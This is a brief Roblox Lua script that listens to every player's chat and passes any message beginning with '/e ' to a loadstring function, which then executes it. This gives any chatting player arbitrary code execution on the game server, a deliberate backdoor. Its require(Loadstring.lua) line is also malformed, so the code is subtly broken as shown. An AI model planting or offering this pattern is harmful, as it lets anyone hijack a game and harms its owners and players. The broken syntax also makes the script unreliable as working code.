local ee=require(Loadstring.lua) 
for i, v in pairs(game.Players:GetChildren()) do 
  v.Chatted:Connect(function(msg)
      if msg:sub(1,3) == "/e " then 
        local args = msg:sub(4) 
        ee(args)() 
      end 
    end)
end
